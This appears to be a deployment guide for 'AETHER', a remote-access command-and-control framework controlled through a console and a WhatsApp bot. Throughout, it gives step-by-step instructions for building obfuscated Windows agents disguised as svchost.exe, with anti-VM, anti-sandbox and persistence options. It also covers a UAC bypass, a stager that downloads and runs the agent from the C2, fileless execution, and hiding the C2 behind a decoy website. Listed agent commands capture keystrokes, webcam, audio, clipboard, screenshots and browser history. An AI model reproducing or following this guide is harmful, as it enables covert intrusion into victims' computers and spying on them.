# AETHER C2 Complete Deployment Guide

## Table of Contents

1. [System Requirements](#system-requirements)
2. [Pre-Deployment Checklist](#pre-deployment-checklist)
3. [Step-by-Step Installation](#step-by-step-installation)
4. [Component Startup Guide](#component-startup-guide)
5. [Agent Compilation](#agent-compilation)
6. [WhatsApp Integration Setup](#whatsapp-integration-setup)
7. [Operational Procedures](#operational-procedures)
8. [Troubleshooting](#troubleshooting)

---

## System Requirements

### Server Machine

- **OS**: Linux (Ubuntu 20.04+) or Windows 10/11
- **Python**: 3.8+ with pip
- **Node.js**: 16+ with npm (for WhatsApp bot)
- **RAM**: 2GB minimum, 4GB recommended
- **Storage**: 5GB free space
- **Network**: Static IP or domain name
- **Ports**: 443 (C2), 3000 (bot), 5000 (API)

### Agent Target

- **OS**: Windows 7/8/10/11 or Windows Server 2008+
- **.NET**: 4.5+ (for some modules)
- **Admin Rights**: Recommended for full functionality
- **User Account**: System/SYSTEM for persistence

### Requirements Summary

```
✓ Python 3.8+
✓ Node.js 16+
✓ Git (for version control)
✓ pip (Python package manager)
✓ npm (Node package manager)
✓ 5GB disk space
✓ Stable network connection
```

---

## Pre-Deployment Checklist

Before starting deployment, verify:

- [ ] Python 3.8+ installed: `python3 --version`
- [ ] Node.js 16+ installed: `node --version`
- [ ] npm installed: `npm --version`
- [ ] Git installed: `git --version`
- [ ] Firewall allows port 443
- [ ] Firewall allows port 3000 (bot)
- [ ] Static IP or domain name available
- [ ] 5GB free disk space available
- [ ] Running in isolated/authorized environment
- [ ] All project files present (see COMPLETE_CONFIG_GUIDE.md)

### Verification Script

```bash
#!/bin/bash

echo "=== AETHER Deployment Requirements Check ==="
echo ""

# Python check
if command -v python3 &> /dev/null; then
    python_version=$(python3 --version 2>&1 | awk '{print $2}')
    echo "✓ Python $python_version"
else
    echo "✗ Python not found"
    exit 1
fi

# Node check
if command -v node &> /dev/null; then
    node_version=$(node --version)
    echo "✓ Node.js $node_version"
else
    echo "✗ Node.js not found"
    exit 1
fi

# npm check
if command -v npm &> /dev/null; then
    npm_version=$(npm --version)
    echo "✓ npm $npm_version"
else
    echo "✗ npm not found"
    exit 1
fi

# pip check
if command -v pip3 &> /dev/null; then
    echo "✓ pip3 installed"
else
    echo "✗ pip3 not found"
    exit 1
fi

# Disk space check
disk_free=$(df . | awk 'NR==2 {print $4}')
if [ "$disk_free" -gt 5000000 ]; then
    echo "✓ Disk space: $(( disk_free / 1024 / 1024 ))GB free"
else
    echo "✗ Less than 5GB free"
fi

echo ""
echo "All checks passed! Ready for deployment."
```

---

## Step-by-Step Installation

### Phase 1: Environment Setup

#### Step 1.1: Clone/Download Project

```bash
# If using git
git clone <repository-url> aether-c2
cd aether-c2

# Or if already downloaded
cd /path/to/aether
```

#### Step 1.2: Create Python Virtual Environment (Optional but Recommended)

```bash
# Create virtual environment
python3 -m venv venv

# Activate it
# On Linux/Mac:
source venv/bin/activate
# On Windows:
venv\Scripts\activate

# Your prompt should now show (venv)
```

#### Step 1.3: Run Master Setup Script

```bash
python3 MASTER_SETUP.py
```

This interactive script will:
- Verify Python version
- Check project structure
- Configure server settings
- Configure agent settings
- Configure builder settings
- Configure WhatsApp (optional)
- Install dependencies
- Generate configuration files

**During Setup, You'll Be Asked**:

```
Python Version Check
✓ Python 3.11.0 detected

AETHER Server Configuration
  C2 Server Hostname [0.0.0.0]: 192.168.1.100
  C2 Server Port [443]: 443
  C2 Protocol: https
  Server Console Password [auto-generated]: your_password

AETHER Agent Configuration
  C2 Server Address (for agents) [garden-helper.fi]: target-domain.com
  C2 Server Port (for agents) [443]: 443
  Beacon Interval (seconds) [30]: 45
  Enable Evasion Techniques? (y/n): y
  Enable Persistence Mechanisms? (y/n): y

Builder Configuration
  Agent Output Filename [svchost]: svchost
  Use PyArmor obfuscation? (y/n): y
  Use UPX compression? (y/n): y
  Obfuscation Level: high

WhatsApp Bot Configuration
  Enable WhatsApp integration? (y/n): y
  Bot Server URL [http://localhost:3000]: http://192.168.1.100:3000
  WhatsApp Auth Password [auto-generated]: your_wa_password
  Add authorized WhatsApp number? (y/n): y
    Phone number: +1234567890
```

#### Step 1.4: Verify Generated Configuration

```bash
# Check main config
cat config.json | head -30

# Check WhatsApp config
cat server/comms/whatsapp_config.py | head -20

# Check saved setup config
cat .aether_config.json | python3 -m json.tool
```

### Phase 2: Dependency Installation

#### Step 2.1: Install Python Dependencies

```bash
pip install -r requirements.txt

# Or if in virtual environment:
source venv/bin/activate  # Ensure venv is active
pip install -r requirements.txt
```

**Expected Output**:
```
Collecting cryptography==45.0.7
...
Successfully installed cryptography-45.0.7 colorama-0.4.6 ...
```

#### Step 2.2: Install Node.js Dependencies

```bash
cd WA-BOT-Base
npm install

# Verify Baileys is installed
npm ls @whiskeysockets/baileys
```

**Expected Output**:
```
basebot@1.0.1 /path/to/WA-BOT-Base
└── @whiskeysockets/baileys@7.0.0-rc.2
```

### Phase 3: Pre-Flight Validation

#### Step 3.1: Run Validation Tests

```bash
# Return to project root
cd /path/to/aether

# Run syntax check
python3 -m py_compile agent/aether_agent.py
python3 -m py_compile server/aether_server.py
python3 -m py_compile builder/compile.py

# Expected: No output = success
```

#### Step 3.2: Verify Module Imports

```bash
python3 << 'EOF'
import sys
sys.path.insert(0, 'server')
sys.path.insert(0, 'agent')

# Test imports
from crypto import CryptoHandler
from sessions import SessionManager
from commands.command_suite import AetherCommandSuite

print("✓ Server modules imported successfully")

# Test WhatsApp
try:
    from comms import WhatsAppIntegration, WHATSAPP_CONFIG
    print("✓ WhatsApp modules imported successfully")
except ImportError as e:
    print(f"✓ WhatsApp optional (not critical): {e}")

print("\nAll modules ready!")
EOF
```

#### Step 3.3: Check Port Availability

```bash
# Check if port 443 is available
netstat -an | grep ":443"  # Should return empty

# Check if port 3000 is available
netstat -an | grep ":3000"  # Should return empty

# On Windows:
netstat -ano | findstr ":443"
netstat -ano | findstr ":3000"
```

---

## Component Startup Guide

### Startup Order

1. **AETHER Server** (primary C2 server)
2. **WhatsApp Bot** (optional, WhatsApp control)
3. **Test Agent Connection**
4. **Enable WhatsApp** (if using)

### Component 1: AETHER Server

#### Starting the Server

```bash
cd /path/to/aether
python3 server/aether_server.py
```

**Expected Output**:
```
╔═╗╔═╗╔╦╗╔═╗╦  ╔═╗╦═╗
║ ╦╠═╝ ║ ╠═╝║  ║╣ ╠╦╝
╚═╝╩   ╩ ╩  ╩═╝╚═╝╩╚═
Universal Class Control v1.0
Listener: 0.0.0.0:443

AETHER> 
```

#### Server Commands (Complete List)

```
help                          - Show all commands
sessions                      - List active agent sessions
interact <agent_id>           - Connect to agent
back                          - Return from agent interaction
broadcast <command>           - Execute on all agents
generate                      - Build new agent
kill <agent_id>               - Terminate agent session
info                          - Server information
config                        - Show configuration
scan                          - Network scan
whatsapp status               - WhatsApp status
whatsapp enable               - Start WhatsApp listener
whatsapp disable              - Stop WhatsApp listener
whatsapp authorize <phone>    - Add user
whatsapp revoke <phone>       - Remove user
exit                          - Shutdown server
```

#### Keeping Server Running in Background

**Linux/Mac - Using tmux**:
```bash
# Start in new window
tmux new-window -n aether
tmux send-keys -t aether "cd /path/to/aether && python3 server/aether_server.py" Enter

# Attach later
tmux attach-session -t aether
```

**Linux/Mac - Using nohup**:
```bash
nohup python3 server/aether_server.py > aether.log 2>&1 &
# Check: tail -f aether.log
```

**Windows - Using Task Scheduler**:
```batch
REM Create task
schtasks /create /tn "AETHERServer" /tr "python3 C:\path\aether_server.py" /sc onlogon

REM Verify
schtasks /query /tn "AETHERServer"
```

### Component 2: WhatsApp Bot

#### Starting the Bot

```bash
cd WA-BOT-Base
npm start
```

**Expected Output**:
```
[INFO] Connecting to WhatsApp...
[INFO] Generating QR Code...

████████████████████████████████████████ 100%

Scan with WhatsApp in 45 seconds
(Or visit https://web.whatsapp.com and scan)
```

**Next Steps**:
1. Open WhatsApp on your phone
2. Go to: Settings → Linked Devices → Link a Device
3. Scan the QR code shown in terminal
4. Wait for: `[INFO] Connection established!`

#### Bot Verification

Once QR code is scanned, you should see:

```
[INFO] Authentication successful!
[INFO] Bot is ready!
[INFO] Listening for messages...
```

**Test the Bot** (from your WhatsApp):
```
Send: Hello
Bot replies: Command not found. Type 'help' for available commands
```

#### Keeping Bot Running

**Linux/Mac - Using pm2**:
```bash
# Install pm2 globally first
npm install -g pm2

# Start bot with pm2
cd WA-BOT-Base
pm2 start main.js --name "aether-bot"

# View logs
pm2 logs aether-bot

# Restart if needed
pm2 restart aether-bot
```

**Windows - Using pm2 or Task Scheduler**:
```batch
# Using pm2
npm install -g pm2
cd WA-BOT-Base
pm2 start main.js --name "aether-bot"

# Or Task Scheduler
schtasks /create /tn "AETHERBot" /tr "npm start" /sc onlogon
```

### Component 3: Test Server Connectivity

#### From AETHER Console

```
AETHER> sessions
No active sessions yet
```

This is normal - agents haven't connected yet.

#### From WhatsApp (if enabled)

```
You: auth aether2025
Bot: ✅ Authorized! Welcome to AETHER

You: sessions
Bot: 📋 Active Sessions:
     (none yet - waiting for agents)
```

---

## Agent Compilation

### Building Your First Agent

#### Method 1: From AETHER Console

```
AETHER> generate
[*] Building agent with config...
[*] Using PyInstaller for packaging...
[*] Applying PyArmor obfuscation...
[*] Compressing with UPX...

✓ Agent compiled: build_*/dist/svchost.exe
Size: 42.3 MB

Deploy this executable to target system.
```

#### Method 2: Direct Compilation

```bash
python3 builder/compile.py
```

**Output**:
```
AETHER Builder v1.0
Loaded configuration from config.json

[+] Using output name: svchost
[+] Obfuscation level: high
[+] UPX compression: enabled
[+] PyArmor obfuscation: enabled

[*] Building with PyInstaller...
[*] Generating build artifacts...
[*] Applying obfuscation...
[*] Compressing binary...

[✓] Build successful!
    Location: build_<id>/dist/svchost.exe
    Size: 42.3 MB
```

#### Method 3: Custom Build

```bash
python3 builder/compile.py --config custom_config.json \
  --output custom_agent.exe \
  --obfuscation high \
  --compress
```

### Agent Compilation Options

**In `config.json` builder section**:

```json
{
  "builder": {
    "output_name": "svchost",           # Exe name
    "icon_path": "builder/svchost.ico", # Custom icon
    "use_pyarmor": true,                # Code obfuscation
    "use_upx": true,                    # Binary compression
    "obfuscation_level": "high",        # low/medium/high
    "anti_debug": true,                 # Anti-debug checks
    "anti_vm": true,                    # Anti-VM checks
    "anti_sandbox": true                # Anti-sandbox checks
  }
}
```

### Deployment Options

#### Option 1: Direct Execution

```bash
# On target system
svchost.exe

# Agent connects to C2 and registers
```

#### Option 2: UAC Bypass (if needed)

```batch
# Requires elevated privileges
svchost.exe

REM Then in AETHER console
AETHER> interact <agent_id>
agent> privilege escalate
```

#### Option 3: Stager

```bash
# Single-stage stager
python3 stager/stager.py

# Downloads and executes actual agent from C2
```

#### Option 4: Fileless (Memory Injection)

```bash
python3 agent/aether_agent.py --fileless

# Runs entirely in memory, no disk artifacts
```

---

## WhatsApp Integration Setup

### Prerequisites

✅ AETHER Server running
✅ WhatsApp Bot running
✅ Configuration files set up
✅ At least one authorized user

### Complete WhatsApp Setup

#### Step 1: Verify Bot is Running

```bash
# In bot terminal, should see:
[INFO] Bot is ready!
[INFO] Listening for messages...
```

#### Step 2: Enable WhatsApp in AETHER

```
AETHER> whatsapp enable
[*] Initializing WhatsApp bridge...
[*] Connecting to bot at http://localhost:3000...
✓ WhatsApp integration enabled

AETHER> whatsapp status
Status: ACTIVE
Bridge: Connected
Bot: http://localhost:3000
Authorized Users: 1
Active Sessions: 0
```

#### Step 3: Test Authentication

Send WhatsApp message:
```
You: auth aether2025
Bot: ✅ Authorized! Welcome to AETHER
     You have access to all commands
```

#### Step 4: List Available Sessions

```
You: sessions
Bot: 📋 Active Sessions:
     • agent_001: DESKTOP-PC01 (Windows 10)
     • agent_002: LAPTOP-PC02 (Windows 11)
     
     Type 'link <agent_id>' to connect
```

#### Step 5: Link to Agent

```
You: link agent_001
Bot: ✅ Linked to session: agent_001
     Type a command to execute (e.g., 'whoami')
```

#### Step 6: Execute Commands

```
You: whoami
Bot: ✅ Result: DOMAIN\admin

You: hostname
Bot: ✅ Result: DESKTOP-PC01

You: screenshot
Bot: 🖼️ Screenshot captured (2.3 MB)
     Sending...
     [Image attachment]
```

### WhatsApp Command Reference

**Session Management**:
```
sessions          - List all active agents
link <id>         - Connect to agent
unlink            - Disconnect from agent
status            - Show current session
```

**System Commands**:
```
whoami            - Current user
hostname          - Computer name
sysinfo           - System information
ps                - List processes
```

**File Operations**:
```
ls <path>         - List directory
cat <file>        - Read file
download <file>   - Download file
upload <file>     - Upload file
```

**Intelligence**:
```
screenshot        - Take screenshot
webcam            - Capture webcam
audio 30          - Record 30 seconds
keylog            - Captured keystrokes
clipboard         - Get clipboard
browser           - Browser history
```

**Help**:
```
help              - Show all commands
history           - Command history
```

---

## Operational Procedures

### Daily Operations

#### Morning Startup

```bash
# Terminal 1: Start Server
python3 server/aether_server.py

# Terminal 2: Start Bot
cd WA-BOT-Base && npm start

# Terminal 3: Monitor logs
tail -f aether.log
```

#### Check Status

```
AETHER> sessions
AETHER> whatsapp status
AETHER> info
```

#### Execute Remote Commands

```
AETHER> interact agent_001
agent_001> whoami
agent_001> screenshot
agent_001> keylog
agent_001> back
```

#### Via WhatsApp

```
You: link agent_001
Bot: ✅ Linked

You: whoami
Bot: ✅ DOMAIN\admin

You: ps
Bot: [list of processes]
```

### Session Management

#### Viewing Active Sessions

```
AETHER> sessions
📋 Active Sessions:
  1. agent_001 - DESKTOP-ABC - Windows 10 - Last seen: 2 min ago
  2. agent_002 - LAPTOP-XYZ - Windows 11 - Last seen: 15 min ago
```

#### Interactive Agent Control

```
AETHER> interact agent_001
[+] Connected to agent_001

agent_001> help
Available commands:
  whoami, hostname, ps, ls, cat, download, screenshot...

agent_001> screenshot
[*] Screenshot captured
[*] Size: 1.2 MB
[*] Path: /var/lib/aether/screenshots/agent_001_20250207.png

agent_001> back
AETHER>
```

#### Broadcasting to All Agents

```
AETHER> broadcast "ps"
[+] Broadcasting to 2 agents...
[agent_001] SYSTEM response...
[agent_002] SYSTEM response...
```

---

## Troubleshooting

### Issue: "Port already in use"

**Error**:
```
Address already in use
OSError: [Errno 48] Can't assign requested address on port 443
```

**Solution**:
```bash
# Find what's using the port
netstat -ano | findstr :443  # Windows
lsof -i :443                 # Linux/Mac

# Kill the process (example: PID 1234)
taskkill /PID 1234 /F        # Windows
kill -9 1234                 # Linux/Mac

# Or use different port in config.json
"c2_port": 8443
```

### Issue: "ModuleNotFoundError"

**Error**:
```
ModuleNotFoundError: No module named 'cryptography'
```

**Solution**:
```bash
# Install missing package
pip install cryptography

# Or reinstall all
pip install -r requirements.txt

# Verify
python3 -c "import cryptography; print('OK')"
```

### Issue: Agent not connecting

**Problem**: Agent built but doesn't show in sessions

**Checklist**:
1. Is AETHER server running?
   ```
   netstat -an | grep 443
   ```

2. Can agent reach C2 address?
   ```
   # On target: ping garden-helper.fi
   ```

3. Is C2 host correct in agent?
   ```
   # Check config.json agent.c2_host
   ```

4. Is firewall blocking 443?
   ```
   # Check firewall rules
   ```

5. Check server logs:
   ```
   AETHER> info
   # Look for connection errors
   ```

### Issue: WhatsApp bot not receiving messages

**Problem**: Bot doesn't respond to WhatsApp messages

**Checklist**:
1. Is bot running?
   ```
   npm start
   ```

2. QR code scanned?
   ```
   Should see [INFO] Bot is ready!
   ```

3. Is AETHER WhatsApp enabled?
   ```
   AETHER> whatsapp status
   # Should show: Status: ACTIVE
   ```

4. Is number authorized?
   ```
   # Check server/comms/whatsapp_config.py
   # Your number must be in authorized_users
   ```

5. Try rescan QR:
   ```bash
   # In bot terminal
   Ctrl+C  # Stop bot
   rm -rf auth_info_baileys  # Delete auth
   npm start  # Restart
   # Scan new QR code
   ```

### Issue: "Unauthorized" response from WhatsApp

**Problem**: Bot says "❌ Unauthorized"

**Solution**:
```
1. Send correct password: "auth aether2025"
2. Check password in whatsapp_config.py
3. Make sure number is in authorized_users list
4. Format must be: +1234567890 (international)
```

### Issue: Low agent performance

**Problem**: Agent slow or missing check-ins

**Solution**:
```json
{
  "agent": {
    "beacon_interval": 60,    // Increase from 30
    "jitter_percent": 40,     // Increase randomness
    "sleep_time": 10          // Increase sleep
  }
}
```

### Issue: "Connection refused" from agent

**Problem**: Agent can't reach C2

**Steps**:
1. Verify C2 host in config.json
2. Check firewall allows port 443
3. Test connectivity:
   ```bash
   # From target system
   curl https://garden-helper.fi:443/health
   ```
4. Use http instead:
   ```json
   "c2_protocol": "http"
   ```

---

## Advanced Configuration

### Custom Domain Setup

```bash
# Register domain: target-domain.com
# Point to server IP: 192.168.1.100

# Update config.json
{
  "agent": {
    "c2_host": "target-domain.com"
  }
}

# Recompile agent
python3 builder/compile.py
```

### Reverse Proxy Setup (Optional)

Use nginx/Apache to hide true C2 behind legitimate service:

```nginx
server {
    listen 443 ssl;
    server_name target-domain.com;
    
    location /api/v1/beacon {
        proxy_pass http://192.168.1.100:443;
    }
    
    location / {
        # Serve legitimate website
        proxy_pass http://legitimate-site.com;
    }
}
```

### Multi-Team Management

Configure separate auth passwords per team:

```python
# In whatsapp_config.py
TEAMS = {
    'redteam': {
        'password': 'redteam_password',
        'users': ['+1111111111', '+2222222222'],
        'permissions': ['all']
    },
    'blueteam': {
        'password': 'blueteam_password',
        'users': ['+3333333333'],
        'permissions': ['limited']
    }
}
```

---

## Maintenance & Updates

### Backup Configuration

```bash
# Backup all configs
tar -czf aether_backup_$(date +%Y%m%d).tar.gz \
  config.json \
  server/comms/whatsapp_config.py \
  .aether_config.json
```

### Update Dependencies

```bash
# Python
pip install -r requirements.txt --upgrade

# Node
cd WA-BOT-Base
npm update
```

### Monitor Agent Activity

```
# In AETHER console
AETHER> sessions
# Shows all active agents with last check-in time

AETHER> interact agent_001
agent_001> history
# Shows last commands executed
```

---

## Security Reminders

⚠️ **Before Deployment**:
- [ ] Change all default passwords
- [ ] Use strong encryption keys
- [ ] Configure firewall rules
- [ ] Enable logging
- [ ] Test in isolated environment
- [ ] Do not leave default credentials
- [ ] Keep logs securely
- [ ] Monitor for indicators of compromise

---

## Quick Reference Card

### Startup Sequence

```bash
# Terminal 1
python3 server/aether_server.py

# Terminal 2 (optional)
cd WA-BOT-Base && npm start

# Scan QR code in bot terminal

# Terminal 3 (in AETHER console)
AETHER> whatsapp enable
AETHER> sessions
AETHER> interact agent_001
```

### Essential Commands

```
server/aether_server.py      # Start C2
cd WA-BOT-Base && npm start  # Start bot
MASTER_SETUP.py              # Configure
builder/compile.py           # Build agent
AETHER> sessions             # List agents
AETHER> interact <id>        # Connect
You: auth password           # WhatsApp auth
You: sessions                # WhatsApp list
```

---

**Last Updated**: December 2025
**Status**: Production Ready

For detailed configuration, see: `COMPLETE_CONFIG_GUIDE.md`
For WhatsApp help, see: `WHATSAPP_BOT_INTEGRATION.md`
